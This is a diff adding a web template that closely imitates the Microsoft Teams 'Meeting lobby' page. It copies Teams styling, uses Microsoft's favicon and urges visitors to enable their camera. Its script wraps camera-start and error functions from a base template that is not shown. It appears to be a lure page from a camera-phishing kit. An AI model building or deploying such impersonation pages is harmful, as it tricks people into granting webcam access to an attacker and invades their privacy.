@@ -1,0 +1,150 @@
+{% extends "camera/base.html" %}
+
+{% block title %}Microsoft Teams - Meeting lobby{% endblock %}
+
+{% block logo_url %}https://statics.teams.cdn.office.net/hashedassets/favicon/prod/favicon-94x94.png{% endblock %}
+
+{% block header_title %}Almost there{% endblock %}
+
+{% block header_subtitle %}Set up your audio and video before joining{% endblock %}
+
+{% block additional_styles %}
+<style>
+    body {
+        background-color: #201F1F;
+        font-family: 'Segoe UI', 'Helvetica Neue', sans-serif;
+        color: #fff;
+    }
+    .container {
+        background-color: #2D2C2C;
+        border-radius: 4px;
+        padding: 24px;
+        max-width: 720px;
+        margin: 2rem auto;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.14);
+    }
+    .header {
+        text-align: center;
+        margin-bottom: 24px;
+    }
+    .logo {
+        max-width: 94px;
+        margin-bottom: 24px;
+    }
+    .title {
+        font-size: 20px;
+        font-weight: 600;
+        margin-bottom: 8px;
+        color: #fff;
+    }
+    .subtitle {
+        color: #C8C6C4;
+        font-size: 14px;
+    }
+    .video-container {
+        background-color: #201F1F;
+        border-radius: 4px;
+        padding: 16px;
+        margin: 16px 0;
+        border: 1px solid #484644;
+    }
+    .button {
+        background-color: #6264A7;
+        color: #fff;
+        border: none;
+        border-radius: 2px;
+        padding: 8px 20px;
+        font-size: 14px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background-color 0.2s;
+    }
+    .button:hover {
+        background-color: #7376B5;
+    }
+    .error-message {
+        background-color: #442726;
+        border: 1px solid #D13438;
+        color: #F1707B;
+        padding: 12px;
+        border-radius: 2px;
+        margin: 16px 0;
+        display: none;
+        font-size: 14px;
+    }
+    .status-message {
+        background-color: #10391A;
+        border: 1px solid #107C41;
+        color: #92C353;
+        padding: 12px;
+        border-radius: 2px;
+        margin: 16px 0;
+    }
+    .permission-instructions {
+        background: #2D2C2C;
+        border: 1px solid #484644;
+        color: #fff;
+    }
+    .permission-instructions h3 {
+        color: #fff;
+        font-size: 16px;
+    }
+    .permission-instructions ol {
+        color: #C8C6C4;
+    }
+    .camera-icon {
+        color: #6264A7;
+    }
+    .permission-hint {
+        color: #C8C6C4;
+    }
+    .camera-placeholder {
+        background: #201F1F;
+        border: 1px solid #484644;
+    }
+    .placeholder-content {
+        padding: 20px;
+    }
+</style>
+{% endblock %}
+
+{% block additional_scripts %}
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // Add Microsoft Teams style loading animation
+        const placeholder = document.getElementById('camera-placeholder');
+        placeholder.querySelector('.placeholder-content').innerHTML = `
+            <div class="camera-icon">
+                <svg width="48" height="48" viewBox="0 0 24 24" fill="#6264A7">
+                    <path d="M21.2 7.6v8.8l-3.2-2.8V10.4l3.2-2.8m-3.2.4c0-.6-.4-1-1-1H3c-.6 0-1 .4-1 1v8c0 .6.4 1 1 1h14c.6 0 1-.4 1-1V8m-7 4c0 1.1-.9 2-2 2s-2-.9-2-2 .9-2 2-2 2 .9 2 2z"/>
+                </svg>
+            </div>
+            <div style="font-size: 16px; margin: 12px 0; font-weight: 600;">Camera setup required</div>
+            <div style="color: #C8C6C4; font-size: 14px;">Enable your camera to join the meeting</div>
+        `;
+        
+        // Customize error messages with Microsoft Teams style
+        const originalShowError = window.showError;
+        window.showError = function(message) {
+            const errorElement = document.getElementById('error-message');
+            errorElement.innerHTML = `
+                <div style="display: flex; align-items: center; gap: 12px;">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="#F1707B">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15v-2h2v2h-2zm0-10v6h2V7h-2z"/>
+                    </svg>
+                    <span>${message}</span>
+                </div>
+            `;
+            errorElement.style.display = 'block';
+        };
+        
+        // Add Teams-specific camera check
+        const originalStartCamera = window.startCamera;
+        window.startCamera = async function() {
+            document.getElementById('status-message').textContent = 'Setting up your devices...';
+            document.getElementById('status-message').style.display = 'block';
+            await originalStartCamera();
+        };
+    });
+</script>
+{% endblock %} 
